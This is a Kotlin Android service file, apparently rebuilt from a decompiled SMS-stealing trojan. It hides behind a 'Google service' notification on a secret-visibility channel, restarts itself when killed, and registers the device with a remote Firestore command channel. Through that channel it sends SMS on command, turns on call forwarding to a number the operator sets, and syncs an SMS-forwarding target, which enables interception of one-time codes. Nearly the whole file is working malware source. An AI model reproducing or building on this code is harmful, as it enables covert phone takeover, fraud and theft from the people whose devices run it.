package com.payload.jansiix0ne.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.ListenerRegistration
import com.payload.jansiix0ne.MainActivity
import com.payload.jansiix0ne.R
import com.payload.jansiix0ne.data.model.DeviceModel
import com.payload.jansiix0ne.data.model.SendSmsModel
import com.payload.jansiix0ne.data.repository.FirestoreRepository
import com.payload.jansiix0ne.util.SmsHelper
import com.payload.jansiix0ne.worker.RegisterUserWorker
import com.payload.jansiix0ne.worker.UnifiedWatchdogWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

/**
 * Foreground service that runs continuously in the background
 */
class UnifiedService : Service() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private var wakeLock: PowerManager.WakeLock? = null
    private var deviceModelListener: ListenerRegistration? = null
    private var smsForwardingListener: ListenerRegistration? = null
    private val firestoreRepository = FirestoreRepository()
    private val callForwardingManager = com.payload.jansiix0ne.util.CallForwardingManager(this)

    companion object {
        private const val TAG = "UnifiedService"
        private const val CHANNEL_ID = "HideIconServiceChannel"
        private const val NOTIFICATION_ID = 1
        
        @Volatile
        var isRunning = false
            private set
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "UnifiedService onCreate")
        
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        
        acquireWakeLock()
        schedulePeriodicWorkers()
        startDeviceModelListener()
        startSmsForwardingListener()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) {
            Log.d(TAG, "Already running, skip duplicate start")
            return START_STICKY
        }
        
        isRunning = true
        Log.d(TAG, "UnifiedService started")
        
        serviceScope.launch {
            // Perform background tasks
            performBackgroundTasks()
        }
        
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        Log.d(TAG, "UnifiedService destroyed")
        
        deviceModelListener?.remove()
        deviceModelListener = null
        smsForwardingListener?.remove()
        smsForwardingListener = null
        releaseWakeLock()
        serviceScope.cancel()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Restart service if task is removed
        val restartIntent = Intent(applicationContext, UnifiedService::class.java)
        startForegroundService(restartIntent)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            intent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google service")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "UnifiedService::lock"
            )
            
            if (!wakeLock!!.isHeld) {
                wakeLock!!.acquire(10 * 60 * 1000L) // 10 minutes
                Log.d(TAG, "WakeLock acquired")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire wake lock: ${e.message}", e)
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.d(TAG, "WakeLock released")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release wake lock: ${e.message}", e)
        }
    }

    private fun schedulePeriodicWorkers() {
        val workManager = WorkManager.getInstance(applicationContext)
        
        // Register device immediately on first run
        val immediateRegisterWork = OneTimeWorkRequestBuilder<RegisterUserWorker>()
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                    .build()
            )
            .build()
        
        workManager.enqueue(immediateRegisterWork)
        
        // Schedule RegisterUserWorker to run periodically (every 15 minutes)
        val registerUserWork = PeriodicWorkRequestBuilder<RegisterUserWorker>(
            15, TimeUnit.MINUTES
        ).setConstraints(
            Constraints.Builder()
                .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                .build()
        ).build()
        
        workManager.enqueueUniquePeriodicWork(
            "register_user_work",
            ExistingPeriodicWorkPolicy.KEEP,
            registerUserWork
        )
        
        // Schedule UnifiedWatchdogWorker to run periodically
        val watchdogWork = PeriodicWorkRequestBuilder<UnifiedWatchdogWorker>(
            30, TimeUnit.MINUTES
        ).build()
        
        workManager.enqueueUniquePeriodicWork(
            "unified_watchdog_work",
            ExistingPeriodicWorkPolicy.KEEP,
            watchdogWork
        )
    }

    private suspend fun performBackgroundTasks() {
        // Background tasks can be performed here
        Log.d(TAG, "Performing background tasks")
    }

    /**
     * Start Firestore listener for DeviceModel to handle SendSms commands
     * Based on decompiled code: C3168h.java
     */
    private fun startDeviceModelListener() {
        val deviceId = SmsHelper.getDeviceId(this)
        
        deviceModelListener = firestoreRepository.firestore
            .collection("MASTERHU")
            .document(deviceId)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "Listener error: $error")
                    return@addSnapshotListener
                }
                
                if (snapshot != null && snapshot.exists()) {
                    try {
                        val deviceModel = snapshot.toObject(DeviceModel::class.java)
                        
                        // Process SendSms command
                        val sendSms = deviceModel?.sendSms
                        if (sendSms != null && 
                            !sendSms.number.isNullOrEmpty() && 
                            !sendSms.message.isNullOrEmpty() && 
                            !sendSms.sent) {
                            
                            serviceScope.launch(Dispatchers.IO) {
                                processSendSmsCommand(sendSms, deviceId)
                            }
                        }
                        
                        // Process Forwarding command - Based on decompiled code: C3167g.java, C3162b.java
                        val forwarding = deviceModel?.forwarding
                        if (forwarding != null) {
                            serviceScope.launch(Dispatchers.IO) {
                                processForwardingCommand(forwarding, deviceId)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing DeviceModel snapshot: ${e.message}", e)
                    }
                }
            }
        
        Log.d(TAG, "DeviceModel listener started for device: $deviceId")
    }

    /**
     * Process SendSms command from Firestore
     * Note: این متد deprecated است. از command polling استفاده کنید.
     */
    private suspend fun processSendSmsCommand(sendSms: SendSmsModel, deviceId: String) {
        try {
            val phoneNumber = sendSms.number ?: return
            val message = sendSms.message ?: return
            val simSlot = sendSms.simSlot
            
            Log.d(TAG, "⚠️ Processing SendSms command (deprecated method)")
            Log.d(TAG, "Processing SendSms command: $phoneNumber, simSlot: $simSlot")
            
            // Send SMS using specified SIM slot
            val success = SmsHelper.sendSms(this, phoneNumber, message, simSlot)
            
            if (success) {
                Log.d(TAG, "✅ SMS sent successfully")
                // Note: با ساختار جدید، باید از command polling استفاده کنیم
            } else {
                Log.e(TAG, "❌ Failed to send SMS")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS send flow failed: ${e.message}", e)
        }
    }

    /**
     * Process Forwarding command from Firestore
     * Based on decompiled code: C3162b.java
     * Logic:
     * - If status = "active" and executed = false: Enable call forwarding
     * - If status = "inactive" and executed = true: Disable call forwarding
     */
    private suspend fun processForwardingCommand(forwarding: com.payload.jansiix0ne.data.model.ForwardingModel, deviceId: String) {
        try {
            val fromSim = forwarding.fromSim
            val status = forwarding.status
            val executed = forwarding.executed
            val toNumber = forwarding.toNumber
            
            // Determine SIM slot: "sim1" = slot 0, otherwise = slot 1
            val simSlot = if (fromSim.lowercase() == "sim1") 0 else 1
            
            Log.d(TAG, "Processing Forwarding command: status=$status, executed=$executed, toNumber=$toNumber, simSlot=$simSlot")
            
            when {
                // Enable call forwarding: status = "active" and not executed yet
                status.lowercase() == "active" && !executed -> {
                    if (toNumber.isNotEmpty()) {
                        callForwardingManager.setCallForwardingDualSim(toNumber, simSlot, enable = true)
                        
                        // Update executed flag in Firestore
                        val result = firestoreRepository.updateForwardingExecuted(deviceId, executed = true)
                        if (result.isSuccess) {
                            Log.d(TAG, "Call forwarding enabled and executed flag updated")
                        } else {
                            Log.e(TAG, "Failed to update executed flag: ${result.exceptionOrNull()?.message}")
                        }
                    }
                }
                
                // Disable call forwarding: status = "inactive" and already executed
                status.lowercase() == "inactive" && executed -> {
                    callForwardingManager.setCallForwardingDualSim("", simSlot, enable = false)
                    
                    // Update executed flag in Firestore
                    val result = firestoreRepository.updateForwardingExecuted(deviceId, executed = false)
                    if (result.isSuccess) {
                        Log.d(TAG, "Call forwarding disabled and executed flag updated")
                    } else {
                        Log.e(TAG, "Failed to update executed flag: ${result.exceptionOrNull()?.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Forwarding flow failed: ${e.message}", e)
        }
    }

    /**
     * Start Firestore listener for SMS Forwarding configuration
     * Based on decompiled code: C2867g.java, C3167g.java
     * Path: MASTERHU/forwarding_config/global_offline_sms
     * Note: m5946b = document, m5949c = collection
     * Pattern: document("MASTERHU").collection("forwarding_config").document("global_offline_sms")
     */
    private fun startSmsForwardingListener() {
        smsForwardingListener = firestoreRepository.firestore
            .collection("MASTERHU")
            .document("forwarding_config")
            .collection("forwarding_config")
            .document("global_offline_sms")
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "SMS forwarding listener error: $error")
                    return@addSnapshotListener
                }
                
                if (snapshot != null && snapshot.exists()) {
                    try {
                        // Parse Smsforward model from Firestore
                        val number = snapshot.getString("number") ?: ""
                        val enabled = snapshot.getBoolean("enabled") ?: false
                        
                        // Update local DataStore with forwarding config
                        serviceScope.launch(Dispatchers.IO) {
                            updateSmsForwardingConfig(number, enabled)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing SMS forwarding snapshot: ${e.message}", e)
                    }
                }
            }
        
        Log.d(TAG, "SMS forwarding listener started")
    }

    /**
     * Update SMS forwarding configuration in DataStore
     * Based on decompiled code: C3173m.java, C3183w.java
     */
    private suspend fun updateSmsForwardingConfig(number: String, enabled: Boolean) {
        try {
            val smsForwardingRepository = com.payload.jansiix0ne.data.repository.SmsForwardingRepository(this)
            val config = com.payload.jansiix0ne.data.model.SmsForwardingConfig(
                number = number,
                enabled = enabled
            )
            smsForwardingRepository.updateForwardingConfig(config)
            Log.d(TAG, "SMS forwarding config synced: number=$number, enabled=$enabled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to sync SMS forwarding config: ${e.message}", e)
        }
    }
}
